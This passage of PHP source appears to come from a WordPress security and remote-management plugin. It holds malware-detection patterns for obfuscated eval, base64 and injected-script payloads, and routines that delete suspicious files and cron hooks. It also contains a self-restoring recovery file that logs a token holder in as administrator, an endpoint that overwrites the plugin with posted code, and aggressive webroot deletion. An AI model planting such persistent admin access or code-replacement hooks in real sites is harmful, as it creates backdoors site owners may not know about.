    // Safe paths: uploads/ (PHP never legitimate), wp-admin/ hex-named files.
    // Does NOT auto-delete from plugins/ or themes/ — too high false-positive risk.
    // Returns list of deleted paths.
    private static function hardenDeleteCriticals(): array {
        @set_time_limit(300);
        $scan    = self::runScan('quick');
        $deleted = [];
        foreach ($scan['results'] ?? [] as $r) {
            if ($r['sev'] !== 'CRITICAL') continue;
            $relPath  = ltrim($r['path'], '/');
            $fullPath = ABSPATH . $relPath;
            $norm     = str_replace('\\', '/', $relPath);

            // Only auto-delete from high-confidence paths:
            $safeToDelete = false;

            // 1. Any PHP in uploads/ — never legitimate
            if (strpos($norm, 'wp-content/uploads/') === 0) {
                $safeToDelete = true;
            }
            // 2. Hex-named PHP in wp-admin/ root (e.g. a3f1c8b2.php)
            if (preg_match('#^wp-admin/[a-f0-9]{8,}\.php$#i', $norm)) {
                $safeToDelete = true;
            }
            // 3. PHP in wp-content/ root (not in plugins/ or themes/)
            if (preg_match('#^wp-content/[^/]+\.php$#i', $norm)) {
                $safeToDelete = true;
            }

            if ($safeToDelete && @file_exists($fullPath) && @unlink($fullPath)) {
                $deleted[] = $r['path'];
            }
        }
        return $deleted;
    }

    // ── Database scanning ─────────────────────────────────────────────────────
    // Scans wp_options (autoloaded), wp_cron, active_plugins, and recent wp_posts
    // for injected malware. Returns array of findings — does NOT modify anything.
    private static function hardenScanDB(): array {
        global $wpdb;
        $findings = [];

        // 1. Scan wp_cron hooks for hex-named callbacks or eval payloads in args
        $cron = _get_cron_array();
        if (is_array($cron)) {
            foreach ($cron as $timestamp => $hooks) {
                if (!is_array($hooks)) continue;
                foreach ($hooks as $hook => $events) {
                    // Flag hooks whose name looks like a hex string (random backdoor names)
                    if (preg_match('/^[a-f0-9]{8,}$/i', (string)$hook)) {
                        $findings[] = [
                            'type'   => 'cron',
                            'key'    => (string)$hook,
                            'value'  => '',
                            'reason' => 'cron hook name is a hex string — likely malware',
                        ];
                        continue;
                    }
                    // Scan args for eval/base64 payloads
                    foreach ((array)$events as $event) {
                        if (empty($event['args'])) continue;
                        $args = @serialize($event['args']);
                        if (!$args) continue;
                        if (preg_match('/eval\s*\(|base64_decode\s*\(|gzinflate\s*\(/i', $args)) {
                            $findings[] = [
                                'type'   => 'cron',
                                'key'    => (string)$hook,
                                'value'  => substr($args, 0, 300),
                                'reason' => 'cron args contain eval/base64 payload',
                            ];
                            break;
                        }
                    }
                }
            }
        }

        // 2. Scan active_plugins for hex-encoded plugin slugs
        $activePlugins = (array) get_option('active_plugins', []);
        foreach ($activePlugins as $slug) {
            if (preg_match('#^[a-f0-9]{8,}/[a-f0-9]{8,}\.php$#i', (string)$slug)) {
                $findings[] = [
                    'type'   => 'plugin',
                    'key'    => 'active_plugins',
                    'value'  => (string)$slug,
                    'reason' => 'hex-named plugin slug — likely backdoor',
                ];
            }
        }

        // 3. Scan autoloaded wp_options for injected PHP/JS malware
        $skipOptions = [
            'cron', 'active_plugins', 'siteurl', 'home', 'auth_key', 'secure_auth_key',
            'logged_in_key', 'nonce_key', 'auth_salt', 'secure_auth_salt', 'logged_in_salt',
            'nonce_salt', 'admin_email', 'blogdescription', 'blogname',
        ];
        $rows = $wpdb->get_results(
            $wpdb->prepare(
                "SELECT option_name, LEFT(option_value, 3000) AS option_value
                 FROM {$wpdb->options}
                 WHERE autoload = %s
                   AND LENGTH(option_value) BETWEEN 50 AND 50000
                 LIMIT 500",
                'yes'
            ),
            ARRAY_A
        );
        $optionPatterns = [
            '/eval\s*\(\s*base64_decode/i'                    => 'eval(base64_decode) in option',
            '/eval\s*\(\s*gzinflate/i'                        => 'eval(gzinflate) in option',
            '/<script[^>]*>.*?eval\s*\(/is'                   => 'eval() inside <script> in option',
            '/document\.write\s*\(\s*unescape\s*\(/i'         => 'document.write(unescape) JS injection',
            '/base64_decode\s*\(\s*[\'"][A-Za-z0-9+\/]{200,}' => 'large base64 blob in option',
        ];
        foreach ((array)$rows as $row) {
            $name = $row['option_name'] ?? '';
            if (in_array($name, $skipOptions, true)) continue;
            $val = $row['option_value'] ?? '';
            foreach ($optionPatterns as $pattern => $reason) {
                if (@preg_match($pattern, $val)) {
                    $findings[] = [
                        'type'   => 'option',
                        'key'    => $name,
                        'value'  => substr($val, 0, 200),
                        'reason' => $reason,
                    ];
                    break;
                }
            }
        }

        // 4. Scan recent wp_posts for injected scripts (scan-only, not cleaned automatically)
        $posts = $wpdb->get_results(
            "SELECT ID, post_title, LEFT(post_content, 3000) AS post_content
             FROM {$wpdb->posts}
             WHERE post_status = 'publish'
               AND post_type IN ('post','page')
               AND LENGTH(post_content) > 20
             ORDER BY ID DESC
             LIMIT 200",
            ARRAY_A
        );
        $postPatterns = [
            '/<script[^>]*>.*?eval\s*\(/is'                    => 'eval() inside <script> in post content',
            '/document\.write\s*\(\s*unescape\s*\(/i'          => 'document.write(unescape) in post',
            '/<iframe[^>]+src=["\']https?:\/\/(?!(?:www\.)?(?:youtube|youtu\.be|vimeo|maps\.google))/i'
                                                                => 'suspicious external iframe in post',
            '/eval\s*\(\s*base64_decode/i'                     => 'eval(base64_decode) in post content',
        ];
        foreach ((array)$posts as $post) {
            $content = $post['post_content'] ?? '';
            foreach ($postPatterns as $pattern => $reason) {
                if (@preg_match($pattern, $content)) {
                    $findings[] = [
                        'type'   => 'post',
                        'key'    => 'post_id:' . ($post['ID'] ?? '?'),
                        'value'  => substr(strip_tags($content), 0, 200),
                        'reason' => $reason . ' (post: ' . esc_html($post['post_title'] ?? '') . ')',
                    ];
                    break;
                }
            }
        }

        return $findings;
    }

    // Cleans the subset of DB malware that is safe to remove automatically:
    //   • cron: removes suspicious hex-named hooks and hooks with eval payloads
    //   • plugin: deactivates and deletes hex-named plugins from active_plugins
    // wp_options and wp_posts are NOT touched — too high false-positive risk.
    // Pass the findings array from hardenScanDB().
    private static function hardenCleanupDB(array $findings): array {
        $cleaned = [];

        foreach ($findings as $f) {
            switch ($f['type']) {

                case 'cron':
                    // wp_clear_scheduled_hook removes all scheduled instances of a hook
                    $result = wp_clear_scheduled_hook((string)$f['key']);
                    $cleaned[] = [
                        'type' => 'cron',
                        'key'  => $f['key'],
                        'ok'   => ($result !== false),
                    ];
                    break;

                case 'plugin':
                    $slug          = (string)$f['value'];
                    $activePlugins = (array) get_option('active_plugins', []);
                    $idx           = array_search($slug, $activePlugins, true);
                    if ($idx !== false) {
                        array_splice($activePlugins, (int)$idx, 1);
                        update_option('active_plugins', $activePlugins);
                    }
                    // Delete the physical plugin file if it exists
                    $pluginFile = WP_CONTENT_DIR . '/plugins/' . $slug;
                    $deleted    = false;
                    if (file_exists($pluginFile)) {
                        $deleted = (bool)@unlink($pluginFile);
                        $dir     = dirname($pluginFile);
                        if (is_dir($dir) && count(@scandir($dir) ?: []) <= 2) {
                            @rmdir($dir);
                        }
                    }
                    $cleaned[] = [
                        'type'        => 'plugin',
                        'key'         => $slug,
                        'deactivated' => ($idx !== false),
                        'deleted'     => $deleted,
                        'ok'          => true,
                    ];
                    break;

                // 'option' and 'post' findings are reported but not auto-cleaned
            }
        }

        return $cleaned;
    }

    // ── WP root non-core PHP cleanup ──────────────────────────────────────────
    // Removes non-WP-core PHP files and non-WP-core directories from ABSPATH.
    // Tries unlink() first; falls back to overwriting with a harmless stub.
    // Also removes non-core dirs entirely (rmdirRecursive).
    // Returns per-item status arrays.
    private static function hardenCleanupRoot(): array {
        $phpExts = ['php','php3','php4','php5','php7','phtml','phar'];
        $root    = rtrim(ABSPATH, '/\\');
        $result  = [
            'ok'               => true,
            'detected_files'   => [],
            'detected_dirs'    => [],
            'deleted'          => [],
            'neutralized'      => [],
            'dirs_removed'     => [],
            'permission_denied'=> [],
        ];

        foreach (@scandir($root) ?: [] as $name) {
            if ($name === '.' || $name === '..') continue;
            $full = $root . '/' . $name;

            // ── Non-core PHP files directly in webroot ──────────────────────
            if (is_file($full)) {
                $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
                if (!in_array($ext, $phpExts, true) || in_array($name, self::$WP_CORE_ROOT_FILES, true)) continue;

                $result['detected_files'][] = $name;

                if (@unlink($full)) {
                    $result['deleted'][] = $name;
                    continue;
                }
                $old = umask(0133);
                $w   = @file_put_contents($full, "<?php // neutralized by SERVER-WALL " . date('Y-m-d') . "\n");
                umask($old);
                if ($w !== false) {
                    $result['neutralized'][] = $name;
                    continue;
                }
                $result['permission_denied'][] = $name;
                continue;
            }

            // ── Non-core directories ────────────────────────────────────────
            if (is_dir($full) && !in_array($name, self::$WP_CORE_ROOT_DIRS, true)) {
                $result['detected_dirs'][] = $name;
                self::rmdirRecursive($full);
                if (!is_dir($full)) {
                    $result['dirs_removed'][] = $name;
                } else {
                    $result['permission_denied'][] = $name . '/';
                }
            }
        }

        $result['ok'] = empty($result['permission_denied'])
            || !empty($result['deleted']) || !empty($result['neutralized']) || !empty($result['dirs_removed']);
        return $result;
    }

    // ── Deploy backup-login (sw_recovery.php) ────────────────────────────────
    // POST /wp-json/server-wall/v1/recovery-login
    // Body: {"hash":"<sha256-hex-64>"}
    // Writes sw_recovery.php with the provided hash embedded, tries wp-admin/ first.
    // Also writes .swrec so the watchdog can restore sw_recovery.php if deleted.
    public static function restDeployRecoveryLogin(WP_REST_Request $request): WP_REST_Response {
        $token = $request->get_header('x_sw_trigger_token');
        if (!$token || !hash_equals(SW_PANEL_TOKEN, $token)) {
            return new WP_REST_Response(['error' => 'forbidden'], 403);
        }
        $body = json_decode($request->get_body(), true) ?: [];
        $hash = $body['hash'] ?? '';
        if (!preg_match('/^[a-f0-9]{64}$/', $hash)) {
            return new WP_REST_Response(['error' => 'invalid hash — must be 64 hex chars'], 400);
        }

        $php = "<?php\n"
             . "\$t = isset(\$_GET['t']) ? \$_GET['t'] : '';\n"
             . "if (!\$t || !hash_equals('" . $hash . "', hash('sha256', \$t))) { http_response_code(404); exit; }\n"
             . "\$dir = __DIR__; \$root = null;\n"
             . "for (\$i = 0; \$i < 6; \$i++) { if (file_exists(\$dir.'/wp-config.php')) { \$root = \$dir; break; } \$dir = dirname(\$dir); }\n"
             . "if (!\$root) exit;\n"
             . "require_once \$root.'/wp-load.php';\n"
             . "\$users = get_users(array('role'=>'administrator','orderby'=>'ID','order'=>'ASC','number'=>1));\n"
             . "if (empty(\$users)) exit;\n"
             . "wp_set_auth_cookie(\$users[0]->ID, true); wp_redirect(admin_url()); exit;\n";

        // Try locations in order: wp-admin/ (first, most reliable), root, wp-content/
        $candidates = [
            ABSPATH . 'wp-admin/sw_recovery.php',
            ABSPATH . 'sw_recovery.php',
            WP_CONTENT_DIR . '/sw_recovery.php',
        ];
        $written = null;
        foreach ($candidates as $p) {
            if (self::safeWrite($p, $php)) {
                $written = $p;
                break;
            }
        }
        if (!$written) {
            return new WP_REST_Response(['error' => 'write failed — all locations blocked'], 500);
        }

        // Write .swrec so watchdog restores sw_recovery.php if deleted
        $muDir = WP_CONTENT_DIR . '/mu-plugins';
        $swrec = json_encode(['path' => $written, 'content' => base64_encode($php)]);
        self::safeWrite($muDir . '/.swrec', $swrec);

        return new WP_REST_Response(['ok' => true, 'path' => $written]);
    }

    // ── Self-update via admin-post ────────────────────────────────────────────
    // Called by the panel via POST /wp-admin/admin-post.php?action=sw_update
    // when plugin-activation-based deploy is blocked by WAF/security plugins.
    // Auth: requires valid WP admin session + SW_PANEL_TOKEN in POST body.
    public static function adminPostSelfUpdate(): void {
        if (!current_user_can('manage_options')) {
            wp_die('Forbidden', 'Error', ['response' => 403]);
        }
        $token = $_POST['sw_token'] ?? '';
        if (!$token || !hash_equals(SW_PANEL_TOKEN, $token)) {
            wp_die('Forbidden', 'Error', ['response' => 403]);
        }
        $content = base64_decode($_POST['content'] ?? '', true);
        if (!$content || strlen($content) < 200) {
            wp_die('Invalid content', 'Error', ['response' => 400]);
        }
        if (file_put_contents(__FILE__, $content) === false) {
            wp_die('Write failed — check file permissions', 'Error', ['response' => 500]);
        }
        echo 'SW_UPDATE_OK';
        exit;
    }

    // ── DB Browser ───────────────────────────────────────────────────────────────

    private static function dbAuthCheck(WP_REST_Request $r): bool {
        $tok = $r->get_header('x_sw_trigger_token');
        return $tok && hash_equals(SW_PANEL_TOKEN, $tok);
    }

    // Shared DB scan logic used by runScan() and restDbScan().
    // $timeBudget: max seconds to spend; 0 = no limit (use 15s default).
    private static function runDbScan(float $timeBudget = 15): array {
        global $wpdb;
        $findings  = [];
        $start     = microtime(true);
        $budget    = $timeBudget > 0 ? $timeBudget : 15;

        $postPatterns = [
            '/\b(казино|казиносайт|casino|gambling|online\s+casino|slots?\s+online|poker\s+online|sports?\s+bett|1xbet|betway|bet365|roulette|blackjack\s+bonus|mostbet|melbet)\b/iu'
                => ['sev' => 'HIGH', 'label' => 'Casino/gambling SEO spam'],
            '/\b(buy\s+viagra|buy\s+cialis|cheap\s+cialis|online\s+pharmacy|order\s+pills|cheap\s+drugs|levitra\s+online|buy\s+tramadol|buy\s+xanax)\b/iu'
                => ['sev' => 'HIGH', 'label' => 'Pharma SEO spam'],
            '/(display\s*:\s*none|font-size\s*:\s*0\s*(?:px)?|visibility\s*:\s*hidden|position\s*:\s*absolute[^"\'<]{0,80}left\s*:\s*-\d{3,})/i'
                => ['sev' => 'MEDIUM', 'label' => 'Hidden content (SEO cloaking)'],
            '/<script[^>]*>[\s\S]{0,200}?eval\s*\(/i'
                => ['sev' => 'CRITICAL', 'label' => 'eval() inside <script> in content'],
            '/eval\s*\(\s*(?:base64_decode|gzinflate|str_rot13)\s*\(/i'
                => ['sev' => 'CRITICAL', 'label' => 'Obfuscated PHP in post content'],
            '/<iframe[^>]+src=["\']https?:\/\/(?!(?:www\.)?(?:youtube|youtu\.be|vimeo|maps\.google|google\.com))/i'
                => ['sev' => 'HIGH', 'label' => 'Suspicious external iframe'],
            '/document\.write\s*\(\s*unescape\s*\(/i'
                => ['sev' => 'HIGH', 'label' => 'JS document.write(unescape) injection'],
        ];

        // 1. Scan wp_posts (posts + pages, all statuses)
        $total = (int)$wpdb->get_var(
            "SELECT COUNT(*) FROM {$wpdb->posts}
             WHERE post_status IN ('publish','draft','private','pending','future')
               AND post_type IN ('post','page')
               AND LENGTH(post_content) > 10"
        );
        $offset   = 0;
        $batchSz  = 200;
        while ($offset < $total && (microtime(true) - $start) < $budget) {
            $rows = $wpdb->get_results($wpdb->prepare(
                "SELECT ID, post_title, post_type, post_status,
                        LEFT(post_content,4000) AS post_content
                 FROM {$wpdb->posts}
                 WHERE post_status IN ('publish','draft','private','pending','future')
                   AND post_type IN ('post','page')
                   AND LENGTH(post_content) > 10
                 LIMIT %d OFFSET %d",
                $batchSz, $offset
            ), ARRAY_A);
            foreach ((array)$rows as $row) {
                $hay = ($row['post_title'] ?? '') . ' ' . ($row['post_content'] ?? '');
                foreach ($postPatterns as $pat => $meta) {
                    if (@preg_match($pat, $hay, $m)) {
                        $findings[] = [
                            'source'   => 'db',
                            'table'    => 'posts',
                            'id'       => (int)$row['ID'],
                            'title'    => wp_strip_all_tags($row['post_title'] ?? ''),
                            'type'     => $row['post_type'],
                            'status'   => $row['post_status'],
                            'severity' => $meta['sev'],
                            'label'    => $meta['label'],
                            'match'    => substr($m[0], 0, 120),
                        ];
                        break; // one finding per post per scan pass
                    }
                }
            }
            $scannedRows = count((array)$rows);
            if ($scannedRows < $batchSz) break;
            $offset += $batchSz;
        }

        // 2. Scan wp_comments (spam links / injected content)
        if ((microtime(true) - $start) < $budget) {
            $commentPatterns = [
                '/\b(casino|gambling|viagra|cialis|pharmacy|payday\s+loan|crypto\s+invest)\b/iu'
                    => ['sev' => 'MEDIUM', 'label' => 'Spam keywords in comment'],
                '/<a\s[^>]*href=["\']https?:\/\/[^"\']{40,}/i'
                    => ['sev' => 'MEDIUM', 'label' => 'Long suspicious URL in comment'],
                '/eval\s*\(|base64_decode\s*\(/i'
                    => ['sev' => 'CRITICAL', 'label' => 'Code injection in comment'],
            ];
            $comments = $wpdb->get_results(
                "SELECT comment_ID, comment_author, comment_author_url,
                        LEFT(comment_content,2000) AS comment_content
                 FROM {$wpdb->comments}
                 WHERE comment_approved = '1'
                   AND LENGTH(comment_content) > 10
                 ORDER BY comment_ID DESC
                 LIMIT 500",
                ARRAY_A
            );
            foreach ((array)$comments as $c) {
                $hay = ($c['comment_content'] ?? '') . ' ' . ($c['comment_author_url'] ?? '');
                foreach ($commentPatterns as $pat => $meta) {
                    if (@preg_match($pat, $hay, $m)) {
                        $findings[] = [
                            'source'   => 'db',
                            'table'    => 'comments',
                            'id'       => (int)$c['comment_ID'],
                            'title'    => wp_strip_all_tags($c['comment_author'] ?? ''),
                            'type'     => 'comment',
                            'status'   => 'approved',
                            'severity' => $meta['sev'],
                            'label'    => $meta['label'],
                            'match'    => substr($m[0], 0, 120),
                        ];
                        break;
                    }
                }
            }
        }

        // 3. Cron + options (reuse existing logic, lightweight)
        if ((microtime(true) - $start) < $budget) {
            $hardenFindings = self::hardenScanDB();
            foreach ($hardenFindings as $hf) {
                $findings[] = [
                    'source'   => 'db',
                    'table'    => $hf['type'] ?? 'option',
                    'id'       => 0,
                    'title'    => $hf['key'] ?? '',
                    'type'     => $hf['type'] ?? 'option',
                    'status'   => '',
                    'severity' => 'HIGH',
                    'label'    => $hf['reason'] ?? 'DB anomaly',
                    'match'    => substr($hf['value'] ?? '', 0, 120),
                ];
            }
        }

        return $findings;
    }

    // POST ?sw_p=1 {"sw_action":"db/scan"} — on-demand DB scan
    public static function restDbScan(WP_REST_Request $request): WP_REST_Response {
        if (!self::dbAuthCheck($request)) return new WP_REST_Response(['error' => 'forbidden'], 403);
        $findings = self::runDbScan(30);
        return new WP_REST_Response(['ok' => true, 'findings' => $findings, 'count' => count($findings)]);
    }

    // POST ?sw_p=1 {"sw_action":"db/list","table":"posts|pages|comments","page":1,"search":"..."}
    public static function restDbList(WP_REST_Request $request): WP_REST_Response {
        global $wpdb;
        if (!self::dbAuthCheck($request)) return new WP_REST_Response(['error' => 'forbidden'], 403);

        $body    = json_decode((string)$request->get_body(), true) ?: [];
        $table   = $body['table'] ?? 'posts';   // posts | pages | comments
        $page    = max(1, (int)($body['page'] ?? 1));
        $perPage = min(50, max(1, (int)($body['per_page'] ?? 20)));
        $search  = trim($body['search'] ?? '');
        $offset  = ($page - 1) * $perPage;

        if ($table === 'comments') {
            $where = "WHERE 1=1";
            $args  = [];
            if ($search !== '') {
                $where .= " AND (comment_content LIKE %s OR comment_author LIKE %s OR comment_author_url LIKE %s)";
                $like   = '%' . $wpdb->esc_like($search) . '%';
                $args   = [$like, $like, $like];
            }
            $total = (int)$wpdb->get_var($wpdb->prepare(
                "SELECT COUNT(*) FROM {$wpdb->comments} $where", ...$args
            ));
            $rows = $wpdb->get_results($wpdb->prepare(
                "SELECT comment_ID AS id,
                        comment_author AS author,
                        comment_author_email AS email,
                        comment_author_url AS url,
                        comment_date AS date,
                        comment_approved AS status,
                        LEFT(comment_content,300) AS excerpt,
                        LENGTH(comment_content) AS content_len
                 FROM {$wpdb->comments} $where
                 ORDER BY comment_ID DESC
                 LIMIT %d OFFSET %d",
                ...[...$args, $perPage, $offset]
            ), ARRAY_A);
        } else {
            $postType = ($table === 'pages') ? 'page' : 'post';
            $where    = "WHERE post_type = %s AND post_status != 'auto-draft'";
            $args     = [$postType];
            if ($search !== '') {
                $where .= " AND (post_title LIKE %s OR post_content LIKE %s)";
                $like   = '%' . $wpdb->esc_like($search) . '%';
                $args[] = $like;
                $args[] = $like;
            }
            $total = (int)$wpdb->get_var($wpdb->prepare(
                "SELECT COUNT(*) FROM {$wpdb->posts} $where", ...$args
            ));
            $rows = $wpdb->get_results($wpdb->prepare(
                "SELECT ID AS id,
                        post_title AS title,
                        post_status AS status,
                        post_date AS date,
                        post_modified AS modified,
                        LENGTH(post_content) AS content_len,
                        LEFT(post_content,300) AS excerpt
                 FROM {$wpdb->posts} $where
                 ORDER BY ID DESC
                 LIMIT %d OFFSET %d",
                ...[...$args, $perPage, $offset]
            ), ARRAY_A);
        }

        return new WP_REST_Response([
            'ok'       => true,
            'table'    => $table,
            'rows'     => $rows ?: [],
            'total'    => $total,
            'page'     => $page,
            'per_page' => $perPage,
            'pages'    => $total > 0 ? (int)ceil($total / $perPage) : 0,
        ]);
    }

    // POST ?sw_p=1 {"sw_action":"db/read","table":"posts|pages|comments","id":123}
    public static function restDbRead(WP_REST_Request $request): WP_REST_Response {
        global $wpdb;
        if (!self::dbAuthCheck($request)) return new WP_REST_Response(['error' => 'forbidden'], 403);

        $body  = json_decode((string)$request->get_body(), true) ?: [];
        $table = $body['table'] ?? 'posts';
        $id    = (int)($body['id'] ?? 0);
        if ($id <= 0) return new WP_REST_Response(['error' => 'invalid id'], 400);

        if ($table === 'comments') {
            $row = $wpdb->get_row($wpdb->prepare(
                "SELECT comment_ID AS id, comment_author AS author, comment_author_email AS email,
                        comment_author_url AS url, comment_date AS date,
                        comment_approved AS status, comment_content AS content
                 FROM {$wpdb->comments} WHERE comment_ID = %d",
                $id
            ), ARRAY_A);
        } else {
            $row = $wpdb->get_row($wpdb->prepare(
                "SELECT ID AS id, post_title AS title, post_content AS content,
                        post_status AS status, post_type AS type,
                        post_date AS date, post_modified AS modified,
                        post_name AS slug, guid AS url
                 FROM {$wpdb->posts} WHERE ID = %d",
                $id
            ), ARRAY_A);
        }

        if (!$row) return new WP_REST_Response(['error' => 'not found'], 404);
        return new WP_REST_Response(['ok' => true, 'row' => $row]);
    }

    // POST ?sw_p=1 {"sw_action":"db/update","table":"posts|pages|comments","id":123,"fields":{...}}
    public static function restDbUpdate(WP_REST_Request $request): WP_REST_Response {
        if (!self::dbAuthCheck($request)) return new WP_REST_Response(['error' => 'forbidden'], 403);

        $body   = json_decode((string)$request->get_body(), true) ?: [];
        $table  = $body['table'] ?? 'posts';
        $id     = (int)($body['id'] ?? 0);
        $fields = $body['fields'] ?? [];
        if ($id <= 0 || empty($fields) || !is_array($fields)) {
            return new WP_REST_Response(['error' => 'id and fields required'], 400);
        }

        if ($table === 'comments') {
            $allowed = ['comment_content', 'comment_approved'];
            $data = array_intersect_key($fields, array_flip($allowed));
            if (empty($data)) return new WP_REST_Response(['error' => 'no allowed fields'], 400);
            $result = wp_update_comment(array_merge(['comment_ID' => $id], $data));
            if ($result === false) return new WP_REST_Response(['error' => 'update failed'], 500);
        } else {
            $allowed = ['post_title', 'post_content', 'post_status', 'post_name'];
            $data = array_intersect_key($fields, array_flip($allowed));
            if (empty($data)) return new WP_REST_Response(['error' => 'no allowed fields'], 400);
            $data['ID'] = $id;
            $result = wp_update_post($data, true);
            if (is_wp_error($result)) {
                return new WP_REST_Response(['error' => $result->get_error_message()], 500);
            }
        }

        return new WP_REST_Response(['ok' => true, 'id' => $id]);
    }

    // POST ?sw_p=1 {"sw_action":"db/delete","table":"posts|pages|comments","id":123}
    public static function restDbDelete(WP_REST_Request $request): WP_REST_Response {
        if (!self::dbAuthCheck($request)) return new WP_REST_Response(['error' => 'forbidden'], 403);

        $body  = json_decode((string)$request->get_body(), true) ?: [];
        $table = $body['table'] ?? 'posts';
        $id    = (int)($body['id'] ?? 0);
        if ($id <= 0) return new WP_REST_Response(['error' => 'invalid id'], 400);

        if ($table === 'comments') {
            $ok = wp_delete_comment($id, true); // force=true skips trash
            if (!$ok) return new WP_REST_Response(['error' => 'delete failed or comment not found'], 500);
        } else {
            // wp_delete_post with force=true: permanent delete, handles postmeta + term relations
            $result = wp_delete_post($id, true);
            if (!$result) return new WP_REST_Response(['error' => 'delete failed or post not found'], 500);
        }

        return new WP_REST_Response(['ok' => true, 'deleted_id' => $id]);
    }

    // POST ?sw_p=1 {"sw_action":"db/delete-bulk","table":"posts|pages|comments","ids":[1,2,3]}
    public static function restDbDeleteBulk(WP_REST_Request $request): WP_REST_Response {
        if (!self::dbAuthCheck($request)) return new WP_REST_Response(['error' => 'forbidden'], 403);

        $body  = json_decode((string)$request->get_body(), true) ?: [];
        $table = $body['table'] ?? 'posts';
        $raw   = $body['ids'] ?? [];
        $ids   = array_values(array_filter(array_map('intval', $raw), function($id){ return $id > 0; }));

        if (empty($ids)) return new WP_REST_Response(['error' => 'no valid ids'], 400);

        $deleted = [];
        $errors  = [];

        foreach ($ids as $id) {
            if ($table === 'comments') {
                $ok = wp_delete_comment($id, true);
                if ($ok) $deleted[] = $id; else $errors[] = $id;
            } else {
                $result = wp_delete_post($id, true);
                if ($result) $deleted[] = $id; else $errors[] = $id;
            }
        }

        return new WP_REST_Response(['ok' => true, 'deleted' => $deleted, 'errors' => $errors, 'count' => count($deleted)]);
    }
}
